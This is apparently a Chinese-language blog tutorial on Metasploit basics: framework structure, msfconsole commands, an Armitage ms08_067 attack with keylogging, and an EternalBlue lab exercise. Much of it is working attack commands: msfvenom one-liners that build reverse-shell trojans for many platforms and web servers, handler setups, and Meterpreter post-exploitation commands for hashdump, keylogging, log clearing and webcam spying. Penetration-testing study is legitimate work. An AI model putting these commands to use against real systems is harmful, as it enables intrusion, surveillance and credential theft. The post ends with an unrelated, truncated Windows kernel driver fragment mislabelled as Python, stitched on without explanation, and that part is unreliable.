<link rel="stylesheet" href="styles/default.css">
<script src="highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>  
---
layout:     post
title:      Metasploit渗透测试工具（一）
subtitle:   基础篇
date:       2017-11-1
author:     volcanohatred
header-img: img/articles/metasploit/title.png
catalog: true
tags:
    - 工具
    - 渗透测试
---

## 1.工具简介

**Metasploit未诞生之前**

黑客社区中对于漏洞的挖掘研究和渗透代码开发鱼龙混，每个人都有自己的辅助工具和方式挖掘漏洞，对验证代码（poc）的编写也是用自己熟悉的编程语言，因为对不同语言，不同编译方式的代码整合难度较大，导致当时漏洞的利用与渗透测试门槛极高，使当时的渗透测试严重两极化，初学者对黑客社区中的资源无能为力。而且，水平相对较高的渗透测试人员也要花很多时间去对这些代码进行整合，所以当时渗透测试效率极差！

**Metasploit时代来临**

Metasploit是由H·D·Moore在2003年夏季创立的一个项目。当时的他正面临着和现在我们在讨论的一样的问题，面对着杂乱无章的漏洞利用代码，浪费了大多数的时间在验证和处理这些代码上面。他意识到开发出一个灵活和可维护的漏洞利用框架平台的重要性。就这样Metasploit就诞生了，Metasploit可以说制定了一套标准框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。也就是说Metasploit的诞生使得渗透测试的门槛低了很多，当然这也间接促进了网络空间安全的快速完善和发展。

## 2.下载地址

`https://www.metasploit.com/download`

`https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version`
## 3.基础教程

### 3.1基本框架介绍

![框架](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片1.png)

**上图为v4之前版本结构框架，现已不再适用**，新版本metasploit框架中msfencode和msfpayload已被msfvenom取代，另外接口现在只有msfconsole和armitage！！！列出来只是为了方便我们理解metasploit框架的基本结构，为以后学习打下基础。

**基础库文件**
　　metasploit基础库文件位于源码根目录路径下的libraries目录中，包括Rex,framework-core和framework-base三部分。
　　Rex是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgreSQL以及MySQL数据库支持等；
　　framework-core库负责实现所有与各种类型的上层模块及插件的交互接口；
　　framework-base库扩展了framework-core，提供更加简单的包装例程，并未处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块；

**模块**
模块是通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。

*辅助模块（aux）*
在渗透信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测等模块。

*渗透攻击模块（exploits）*
利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，以植入和运行攻击载荷，从而获得对目标系统访问控制权的代码组件。metasploit框架中渗透攻击模块可以按照所利用的安全漏洞所在的位置分为主动渗透攻击与被动渗透攻击两大类。
主动渗透攻击：所利用的安全漏洞位于网络服务端软件与服务端软件承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，通过连接目标系统网络服务，注入一些特殊构造的包含“邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进行执行“邪恶”数据中包含的攻击载荷，从而获取目标系统的控制会话。针对网络服务端的主动渗透攻击属于传统的渗透攻击。还有web应用程序渗透攻击、SCADA工业控制系统服务渗透攻击。
被动渗透攻击：利用漏洞位于客户端软件中，如浏览器、浏览插件、电子邮件客户端、office与Adobe等各种文档与编辑软件。对于这类存在于客户端软件的安全漏洞，我们无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击方式。即构造出“邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务端、发送邮件附件、结合社会工程学攻击分发并诱骗目标用户打开、结合网络欺骗和劫持技术，等目标系统上的用户访问到这些邪恶内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的shell会话。客户端软件被动渗透攻击能够绕过防火墙等网络边界防护措施，最常见的两类被动渗透攻击为浏览器软件漏洞攻击和文件格式类漏洞攻击。

*攻击载荷模块（payloads）*
攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段功能简单的ShellCode代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码，在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段机器代码中执行，从而完成ShellCode中实现的单一功能。
metasploit攻击载荷模块分为独立（Single)、传输器（Stager)、传输体（Stage)三种类型。

独立攻击载荷是完全自包含的，可直接独立地植入目标系统进行执行，比如“windows/shell_bind_tcp"是适用于Windows操作系统平台，能够将Shell控制会话绑定在指定TCP端口上的攻击载荷。在一些比较特殊情况下，可能会对攻击载荷的大小、运行条件有所限制，比如特定安全漏洞利用时可填充邪恶攻击缓冲区的可用空间很小、windows 7等新型操作系统所引入的NX(堆栈不可执行）、DEP(数据执行保护）等安全防御机制，在这些场景情况下，Metasploit提供了传输器和传输体配对分阶段植入的技术，由渗透攻击模块首先植入代码精悍短小且非常可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行。

*空指令模块（nops）*
空指令（NOP)是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令，最典型的空指令就是空操作，在X86 CPU体系结构平台上的操作码是ox90.
在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。

*编码器模块（encoders）*
攻击载荷与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit框架还需要完成一道非常重要的工序----编码。
编码模块的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的”坏字符“。
编码器第二个使命是对攻击载荷进行”免杀“处理，即逃避反病毒软件、IDS入侵检测系统和IPS入侵防御系统的检测与阻断。

*后渗透模块（post）*
主要支持在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息，进一步括展，实施跳板攻击等。

**插件**
插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus、OpenVAS漏洞扫描器等，为用户接口提供一些新的功能。

**接口**
msfconsole控制终端、armitage图形化界面。

**功能程序**
除了用户使用用户接口访问metasploit框架主体功能之外，metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。msf*scan系列功能程序提供了在PE、ELF等各种类型文件中搜索特定指令的功能，可以帮助渗透代码开发人员定位指令地址。
### 3.2接口
#### 3.2.1 Msfconsole控制终端
msfconsole提供了一个一体化的集中控制台。通过msfconsole，你可以访问和使用所有的metasploit的插件，payload，利用模块，post模块等等。msfconsole还有第三方程序的接口，比如nmap，sqlmap等，可以直接在msfconsole里面使用。
windows打开cmd，linux打开终端，输入msfconsole，然后回车。这样就打开了msfconsole。msfconsole的系统文件和用户文件在linux中位于/usr/share/metasploit-framework/msfconsole目录下。

![框架](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片2.png)

*Linux（kali）平台*

![框架](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片3.png)

*Windows平台*
当打开msfconsole后，红色的方框里面清楚的标记了Metasploit所有的利用模块、payload、post模块等等。msfconsole有两个查看帮助的选项。一个是msfconsole -h，一个是help。msfconsole –h是显示在msfconsole初始化的选项和参数。而help则是显示进入msfconsole后可以利用的选项。
msfconsole –h参数

![框架](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/基础篇/图片3.png)

‍‍全部参数的解释和利用‍‍
‍‍help‍‍参数
help参数是帮助文档，里面有全部的控制台操作命令解释及注意事项，初学者可以在进入msf控制台后输入help进行查看，在渗透测试中，查看帮助文档很重要，一定要有这个良好的习惯，这样可以提升对未知工具的掌握能力，大多数工具都可以在命令后加-h或--help来获取帮助及用法。当然良好的英文基础也是必要的！


‍‍‍‍
‍‍接下来我要说道msfconsole各个参数的利用和一些解释。‍‍
‍‍Back参数‍‍
Back参数主要用于返回。比如你进入了某一个漏洞模块的设置，但是你想再重新选择一个漏洞模块，那么就需要用到back参数。当然不用返回也可以重新选择，主需要use+模块名就行！
这张图说明，才开始我使用了ms08_067_netapi的利用模块，之后使用了back参数返回。

‍‍Banner参数‍‍
这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。

‍‍Check参数‍‍
这个参数可以查看到某些利用模块更相信的信息。主要是用于查看利用模块是否可用攻击目标主机，‍‍事实上，很多的利用模块都不支持这个参数，大多数模块有专门的验证代码，是分开独立的。‍‍

‍‍Color参数‍‍
‍‍这个参数主要是设置一些命令行的颜色。没什么实质的作用。‍‍

‍‍Connect参数‍‍
这个参数主要用于远程连接主机。一般用于内网渗透。比较常用的命令就是“connect ip地址 端口号”。

如果想查看更详细的connect信息，用到之前的方法，直接输入connect –h就可以了。

‍‍Edit参数‍‍
这个参数的作用就是编辑当前的模块，主要是编辑$VISUAL或者$EDITOR的代码信息。编辑的时候是使用VIM编辑器进行编辑。
‍‍Exit参数‍‍
这个是退出msfconsole的命令。可以完全退出msfconsole，并且回到linux终端界面。

‍‍Info参数‍‍
这个参数可以查看所在模块的信息，包括选项、利用条件、漏洞作者、可以利用的payload等等。
这个info有两种用法，第一种是直接在当前的里面模块下输入info，然后回车查看当前模块的信息。

第二种是输入info后，再在后面输入模块的编号，然后回车查看模块信息。‍‍

‍‍‍‍Irb参数‍‍‍‍
这个参数可以进入irb脚本模式，并且执行命令创建脚本。其语言为Ruby。
‍‍Jobs参数‍‍
这个参数可以查看目前msfconsole上存在哪些任务，并且可以选择结束一些不需要的任务。如果要查看更详细的jobs选项，那么可以直接输入“jobs -h”进行查看。

‍‍Kill参数‍‍
这个参数主要是配合jobs参数进行使用。如果你使用jobs参数后发现了一些不要的任务，那么使用kill参数就可以终止一些不需要的进程。一般都是kill <jobs编号>。
‍‍Load参数‍‍
这个参数可以从metasploit的plug库里面加载一些插件。‍‍
‍‍Unload参数‍‍
这个参数可以终止你已经启动的插件‍‍。
‍‍Resource参数‍‍
这个参数可以运行一些资源文件，有些工具，比如说Karmetasploit无线攻击就很需要这个参数。在后面的文章我会说道怎么使用这个攻击。
‍‍Route参数‍‍
‍‍‍Route参数主要是用来当做跳板。在渗透测试中，目标可能是在一个自身路由无法抵达的内网中，这时我们可以通过给自身添加路由表来使目标ip可达，当然需要一个能连到目标的跳板或目标内网的一个肉鸡ip。还有一些代理的高级用法。详见引文：
http://www.freebuf.com/sectool/56432.html
‍‍Search参数
当你使用msfconsole的时候，你会用到各种漏洞模块、各种插件等等。所以search命令就很重要。我会详细的解释一下这个命令。
当你输入search –h或者是help search的时候就会列出search命令的一些选项。

‍‍通过名称进行查找‍‍
‍‍这里需要用到name：命令。如果我要查找mysql数据库的漏洞，那么就是输入“search name:mysql”‍‍。
‍‍通过路径进行查找‍‍
有时候，我们很遇到这么一种情况，就是只记得模块的路径，但是却忘记了模块的名称。那么就可以用path：命令查找在该路径下的所有模块。如果我要mysql路径下的所有mysql利用模块，那么就输入“search path:mysql”。

‍‍缩小查询范围‍‍
‍‍有时候我们会搜索到大量的模块，那么可以用platform：命令来缩小查询范围。使用platform命令后，所查询的结果会列出rank比较高的模块。如果我要查找mysql的漏洞，那么输入 “search platform：mysql”。大家对比一下上面的截图，发现没有，所有rank为normal的模块全部都屏蔽了，只剩下几个比较高级的利用模块。

‍‍通过类型进行查找‍‍
这里要使用到type：命令。Metasploit上只有三中模块可以利用，第一种是exploit模块，也就是利用模块。第二种是auxiliary模块。第三种是post模块。所以type命令也就只能搜索这个三种模块类型。如果我要搜索post模块，那么就输入“search type：post”：

‍‍通过模块作者名称进行查找‍‍
有时候我们会想看看一个作者所写的所有模块，那么就需要用到author：命令。很多人以为这个是多余的，事实不是。后面你们需要编写自己的漏洞模块，通过这个命令，你们就可以迅速的查找到你们自己的模块。如果我要查找dookie写的所有模块，那么就输入“search author：dookie”：

‍‍联合查找‍‍
大家可以使用上面的参数自行搭配使用。如果我要查找dookie所写的MAC系统的漏洞模块。那么输入“search author:dookie name:MacOS”：

‍‍Sessions参数‍‍
这个参数可以让大家能够交互，查询或者终止当前的一些会话。如果要查看session的选项，直接输入“sessions -h”即可。这里需要注意的是，命令是sessions，不是session。

‍‍Use参数‍‍
这个是使用参数。如你要使用到某个利用模块，payload等，那么就要使用到use参数：
‍‍Set参数‍‍
这个主要是对payload或者其他模块进行设置。比如设置攻击目标的IP就是“set RHOST(大小写不分) 192.168.0.1”：
‍‍Unset参数‍‍
如果使用set命令后，发现设置错误了，可以选择unset重新设置。当然也可以通过’set 设置项 “”’来取消。


‍‍Setg参数‍‍
这个和set有些类似，但是不同的是这个是一个全局变量设置。设置一次后再保存，那么以后，这个漏洞模块你就不用重复设置。但是请注意！如果你在某一个模块设置了全局变量，那么以后使用这个模块的时候请检查option选项。以免做重复的渗透工作。当然，如果你设置错误了，也可以用unsetg命令来重新设置。

设置好后再输入save保存你的全局变量设置。
‍‍Show参数‍‍
这个命令用的很多。请一定认真看。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用。
如果要显示利用模块，那么就输入show exploits。如果要显示payload，那么就输入show payloads。总共可以使用的是那么几个命令，;show auxiliary;, ;show exploits;, ;show payloads;, ;show encoders;, 和 ;show nops;。
如果我进去了某一个利用模块后，要查看这个利用模块的可以加载的负荷就输入show payloads。这里可以自由发挥。
#### 3.2.2 armitage图形化界面
Armitage是一款基于GUI开发的图形化渗透工具，类似nmap和zenmap的区别，它将msfconsole终端图形化，使操作更简单，适合初学者入门。随着学习的深入，不建议使用armitage进行渗透测试。本文只在此处只是简单的介绍。
使用：
在console终端中输入armitage就可以进入界面了。
 
题外话：如果出现无法找到msf数据库等问题，打开终端输入命令：
1./etc/init.d/postgresql start或者service postgresql start；
2.msfdb init；
使用Nmap扫描主机操作系统，扫描完后会自动显示系统图标.

点击Find Attacks查找可用的漏洞.

右键目标，选择smb目录下的ms08_067漏洞 ，这里显示的即为可利用漏洞。

这里Armitage默认帮我们配置好了，可以直接点击Launch。
 出现闪电代表攻击成功。

然后选择lsass method，打开Meterpreter。

在命令行中输入shell便可以与目标机器进行交互了。

选择Log Keystrokes进行键盘记录，此处只是选择了一个，当然还可以进行一系列的后渗透操作，比如窃取摄像头等。

### 3.3模块
上面讲解了接口，现在来说一下模块，在msf中模块可以说贯穿着整个框架，从对目标的信息收集到后面的攻击，都离不开模块的支持。本节主要讲解辅助模块。
辅助模块位于 安装目录/modules/auxiliary/下，涉及各种辅助模块，有主机发现，端口扫描，服务检测等等，当然辅助模块的大部分功能nmap都可以实现，且效率应该高于msf本身带的辅助模块，因为msf支持程序内调用其它工具。
在msfconsole里面输入：show auxiliary


这里只是一部分，还有很多。
事例：··扫描同一子网中的活跃主机：
Use auxiliary/scanner/discovery/arp_sweep

（不支持远程网络）
可以看出有三个ip是活跃的。
··端口扫描
Use auxiliary/scanner/portscan/syn


线程最好设置成10以上不然很慢！！！
··相关服务扫描
Use auxiliary/scanner/telnet/telnet_version(telnet服务版本)
Use auxiliary/scanner/ssh/ssh_version(ssh服务版本)
数据库检测及利用：
use auxiliary/scanner/mysql/mysql_version（查看版本）
use auxiliary/scanner/mysql/mysql_login（对数据库进行暴力破解，数据库允许外连）
use auxiliary/admin/mysql/mysql_enum（数据库信息枚举）
use auxiliary/scanner/mysql/mysql_hashdump（数据库用户hash提取）
use exploit/windows/mysql/mysql_mof（利用数据库用户密码得到一个meterpreter会话）（use exploit/windows/mssql/mssql_payload）也可以
use auxiliary/admin/mssql/mssql_exec（利用数据库密码得到cmd（高权限）的命令执行）
 
### 3.4功能程序
Metasploit框架v4之后提供的功能程序只有msfvenom和msf*scan了，这两个的基本功能和作用在前面的框架介绍中讲过，这里就只讲讲msfvenom，msf*scan因为涉及汇编，调试等基础，所以会在以后的msf高级用法中讲到。v4之前，攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式并进行各种类型的编码需要msfpayload、msfencode和msfvenom协助完成，所以v4之后将它们的功能集成在msfvenom中，所以msfvenom功能很强大！在基础教程中只讲讲用msfvenom生成简单木马，后面的编码等在进阶中会讲到。
利用msfvenom生成简单木马
Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

Web Payloads
PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

Scripting Payloads

Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
关键参数：set exitonsessions false  防止有效荷载意外关闭（这个命令很有用，在渗透测试中，对方已经成功执行了你的木马，或者exploit攻击模块成功执行，会话已经建立，但是又突然意外关闭，这就是exitonsessions没有设置。）
3.use exploit/multi/handler
4.set PAYLOAD <Payload name>
5.set LHOST <LHOST value>
6.set LPORT <LPORT value>
7.set ExitOnSession false
8.exploit 

事例：
生成exe木马：
打开cmd，输入：
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > 输出地址
这里我因为是演示，就输入本地ip：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe > exe.exe

进入msfconsole：
输入命令：
9.use exploit/multi/handler
10.set payload windows/meterpreter/reverse_tcp
11.set lhost 127.0.0.1
12.set lport 6666
13.run
然后点击exe运行：

成功拿到shell，下一步就是对目标机进行一些后续操作了。
生成php木马：（我自己搭建的php网站，因为在虚拟机，我的网关是192.168.106.1）
打开cmd输入：
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.106.1 LPORT=6666 -f raw > c:\\php.php

把生成的php.php放到我的网站根目录。

真实机进行数据访问：
进入msfconsole：
输入命令：
14.use exploit/multi/handler
15.set payload php/meterpreter/reverse_tcp
16.set lhost 192.168.106.1
17.set lport 6666
18.run
然后在真实机访问：




可以看出，连续访问两次会话都是意外关闭，这是没有设置exitonsession这个关键参数！！

生成apk（安卓app）木马：
原理同上，我不一一列举，可以参见下文：
手动安卓应用中注入msf后门
http://www.4hou.com/mobile/5794.html
简易木马的用途有限，就是自己有对方主机的掌控权，或者对方没有杀软，不然像这种级别的木马是百分之百会被查杀的！！！
### 3.5后渗透阶段
后渗透阶段即拿到目标主机反弹的shell后或者在对目标的渗透中离目标主机所在网络位置更进一步后所处的阶段。这个阶段很关键，涉及到对目标机密数据的窃取，和后门安置以及免杀等方面的操作，也是渗透测试中极为关键的一步，后文的进阶会有专门的专题讲解。在msf中，shell类型也就是payload的类型，Metasploit提供了很多payload，meterpreter算是高级payload了。既然是高级payload当然自有它的优势，meterpreter支持多平台，并且可扩展，纯内存的工作模式，而且支持流量加密，所以meterpreter是metasploit框架中必不可少的部分。
? – 帮助菜单
background – 将当前会话移动到背景
bgkill – 杀死一个背景 meterpreter 脚本
bglist – 提供所有正在运行的后台脚本的列表
bgrun – 作为一个后台线程运行脚本
channel – 显示活动频道
close – 关闭通道
exit – 终止 meterpreter 会话
help – 帮助菜单
interact – 与通道进行交互
irb – 进入 Ruby 脚本模式
migrate – 移动到一个指定的 PID 的活动进程
quit – 终止 meterpreter 会话
read – 从通道读取数据
run – 执行以后它选定的 meterpreter 脚本
use – 加载 meterpreter 的扩展
write – 将数据写入到一个通道
第2：文件系统命令
cat -读取并输出到标准输出文件的内容
cd -更改目录对受害人
del -删除文件对受害人
download-从受害者系统文件下载
edit-用 vim编辑文件
getlwd -打印本地目录
getwd -打印工作目录
lcd -更改本地目录
lpwd -打印本地目录
ls -列出在当前目录中的文件列表
mkdir -在受害者系统上的创建目录
pwd -输出工作目录
rm -删除文件
rmdir -受害者系统上删除目录
upload-从攻击者的系统往受害者系统上传文件
3： 网络命令
ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。
portfwd -端口转发
route -查看或修改受害者路由表
4： 系统命令
clearav -清除了受害者的计算机上的事件日志
drop_token -被盗的令牌
execute-执行命令
getpid -获取当前进程 ID (PID)
getprivs -尽可能获取尽可能多的特权
getuid -获取作为运行服务器的用户
kill -终止指定 PID 的进程
ps -列出正在运行的进程
reboot-重新启动受害人的计算机
reg -与受害人的注册表进行交互
rev2self -在受害者机器上调用 RevertToSelf()
shell -在受害者计算机上打开一个shell
shutdown-关闭了受害者的计算机
steal_token -试图窃取指定的 (PID) 进程的令牌
sysinfo -获取有关受害者计算机操作系统和名称等的详细信息
5： 用户界面命令
enumdesktops -列出所有可访问台式机
getdesktop -获取当前的 meterpreter 桌面
idletime -检查长时间以来，受害者系统空闲进程
keyscan_dump -键盘记录软件的内容转储
keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件
keyscan_stop -停止键盘记录软件
screenshot-抓去 meterpreter 桌面的屏幕截图
set_desktop -更改 meterpreter 桌面
uictl -启用用户界面组件的一些控件
6 ： 特权升级命令
getsystem -获得系统管理员权限
7： 密码转储命令
hashdump -抓去哈希密码 (SAM) 文件中的值
8： Timestomp 命令
timestomp -操作修改，访问，并创建一个文件的属性
9：窃取用户摄像头
webcam_chat-开始视频聊天，对方会有弹窗
webcam_list-查看摄像头列表
webcam_snap-拍摄一张照片
webcam_stream-开始摄像监控
当然这些命令不是都能成功执行的，好多会被杀软查杀，还有好多需要系统权限，这个后面的meterpreter后渗透专题会继续深入。
### 3.6实战练习
上文介绍了metasploit大体的结构和简单的用法，现在我们利用所学的知识对一台有漏洞的主机进行测试攻击：
任务：已知局域网中的几台主机都存在ms17010漏洞，请利用msf进行攻击！！
首先用nmap对机房局域网进行了扫描(当然可以利用msf的辅助模块进行扫描的）：


可以看出，开了445端口的主机都存在漏洞，现在对192.168.1.35这台主机进行攻击，当然局域网中的主机都存在漏洞是已知条件，如果不知道主机是否存在ms17010这个漏洞，需要先利用辅助模块中的的auxiliary/scanner/smb/smb_ms17_010来检验是否存在漏洞。此步先跳过。
比如我们现在要使用ms17010的exp，就搜索：
Search cve：2017 type：exploit platform：windows
结果如下图所示，找到了ms17010的对应模块：


完整图在下面：

利用ms17010对win7主机实施入侵：
上面我们找到了ms17010的攻击模块，那就直接来用吧！
命令：use exploit/windows/smb/ms17_010_eternalblue（命令输入时可按tab快速填充）

现在已经进入了exploit攻击模块，先查看一下设置项：
Show options

这里有一些参数不用管，只需要知道rhost填写目标ip地址就行。
命令：set rhost 目标ip

然后在输入命令：run或exploit就行啦！

可以看到返回了目标机的cmd shell而且权限很高，因为这个攻击模块将dll链接文件注入到windows里面的spoolsv.exe进程，这是一个系统进程,所以得到的是系统权限。因为在刚才的参数设置是没有设置payload（攻击荷载），msf会默认一个shell，即bind_shell，但是bind_shell支持的命令有限，实现的功能有限，且不方便。所以，我们换meterpreter荷载来进一步攻击。
用exit命令退出刚才的shell，在kali中直接ctrl+c结束，输入命令：
set payload windows/x64/meterpreter/reverse_tcp
（payload种类很多，最新版msf的payloads有500多个，可使用show  payload命令来查看，你可以根据不同系统而选择。我的电脑是64位的，所以我选择这个payload。）
1.set lhost 本地ip地址
2.set lport 本地监听地址（可不填，默认为4444）
3.run（exploit）

可以看出攻击成功，可以完全的控制目标主机了。
在meterpreter会话中执行ifconfig查看目标主机ip：


这只是一次很简单的利用metasploit框架进行的渗透测试，算是基础中的基础了，掌握了这些才是踏过metasploit的初级门槛，真正的实际用法和高级用法以后会讲到。

```python   
#include <ntddk.h>        //标准驱动头文件

//设备名称 比如C盘对应的设备名：\Device\HarddiskVolume3
#define DEVICE_NAME L"\\device\\ntmodeldrv"    

//用户可见驱动名称 类似C盘
#define LINK_NAME L"\\dosdevices\\ntmodeldrv"  
#define IOCTRL_BASE 0x800          // 0x000-0x7FF被微软占用

#define MYIOCTRL_CODE(i) \
   CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE+i, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define CTL_HELLO MYIOCTRL_CODE(0)
#define CTL_PRINT MYIOCTRL_CODE(1)
#define CTL_BYE MYIOCTRL_CODE(2)

NTSTATUS DispatchCommon(PDEVICE_OBJECT pObject, PIRP pIrp) //释放IRP
{
   pIrp->IoStatus.Status = STATUS_SUCCESS;                  
   pIrp->IoStatus.Information = 0;      //返回R3，不再往下发，过滤驱动会继续下发

   IoCompleteRequest(pIrp, IO_NO_INCREMENT);     //终止IRP

   return STATUS_SUCCESS;            //返回IO管理器
}

NTSTATUS DispatchCreate(PDEVICE_OBJECT pObject, PIRP pIrp)  //打开文件
{
   pIrp->IoStatus.Status = STATUS_SUCCESS;
   pIrp->IoStatus.Information = 0;

   IoCompleteRequest(pIrp, IO_NO_INCREMENT);

   return STATUS_SUCCESS;
}

NTSTATUS DispatchRead(PDEVICE_OBJECT pObject, PIRP pIrp)  //读
{
   PVOID pReadBuffer = NULL;    //要读的buffer地址
   ULONG uReadLength = 0;      //要读的buffer长度
   PIO_STACK_LOCATION pStack = NULL;
   ULONG uMin = 0;
   ULONG uHelloStr = 0;

   uHelloStr = (wcslen(L"hello world") + 1) * sizeof(WCHAR);  //* sizeof(WCHAR)等价于x2

   //第一步，拿到缓存的地址和长度(irp分头和栈)
   //从头部拿缓存地址
   pReadBuffer = pIrp->AssociatedIrp.SystemBuffer;            //SystemBuffer(buffered io),MdlAddress(direct io),UserBuffer(neither io)
   //从栈上拿缓存长度
   pStack = IoGetCurrentIrpStackLocation(pIrp);
   uReadLength = pStack->Parameters.Read.Length;   //Length为应用层缓冲区长度

   //第二步：读，写等操作
   uMin = uReadLength>uHelloStr ? uHelloStr : uReadLength;   //传最小的值(安全考虑)字符串的话字符串长度-1
   RtlCopyMemory(pReadBuffer, L"hello world", uMin);         //内核中拷贝内存函数：RtlCopyMemory

   //第三步，完成IRP
   pIrp->IoStatus.Status = STATUS_SUCCESS;
   pIrp->IoStatus.Information = uMin;        //实际读的长度
   IoCompleteRequest(pIrp, IO_NO_INCREMENT);

   return STATUS_SUCCESS;

}

NTSTATUS DispatchWrite(PDEVICE_OBJECT pObject, PIRP pIrp)
{
   PVOID pWriteBuff = NULL;
   ULONG uWriteLength = 0;
   PIO_STACK_LOCATION pStack = NULL;

   PVOID pBuffer = NULL;

   pWriteBuff = pIrp->AssociatedIrp.SystemBuffer;

   pStack = IoGetCurrentIrpStackLocation(pIrp);
   uWriteLength = pStack->Parameters.Write.Length;

   //分配内存,需要指定分页内存还是非分页内存,非分页内存级别要求高,TSET给内存打标签(4字节),低位优先
   pBuffer = ExAllocatePoolWithTag(PagedPool, uWriteLength, 'TSET');  
   if (pBuffer == NULL)
   {
      pIrp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; 
      pIrp->IoStatus.Information = 0;
      IoCompleteRequest(pIrp, IO_NO_INCREMENT);
      return STATUS_INSUFFICIENT_RESOURCES;
   }

   memset(pBuffer, 0, uWriteLength);

   RtlCopyMemory(pBuffer, pWriteBuff, uWriteLength);

   ExFreePool(pBuffer);      //释放
   pBuffer = NULL;  


   pIrp->IoStatus.Status = STATUS_SUCCESS;
   pIrp->IoStatus.Information = uWriteLength;

   IoCompleteRequest(pIrp, IO_NO_INCREMENT);

   return STATUS_SUCCESS;

}

NTSTATUS DispatchIoctrl(PDEVICE_OBJECT pObject, PIRP pIrp)
{
   ULONG uIoctrlCode = 0;
   PVOID pInputBuff = NULL;
   PVOID pOutputBuff = NULL;

   ULONG uInputLength = 0;
   ULONG uOutputLength = 0;
   PIO_STACK_LOCATION pStack = NULL;

   pInputBuff = pOutputBuff = pIrp->AssociatedIrp.SystemBuffer; 

   pStack = IoGetCurrentIrpStackLocation(pIrp);
   uInputLength = pStack->Parameters.DeviceIoControl.InputBufferLength;
   uOutputLength = pStack->Parameters.DeviceIoControl.OutputBufferLength;


   uIoctrlCode = pStack->Parameters.DeviceIoControl.IoControlCode;

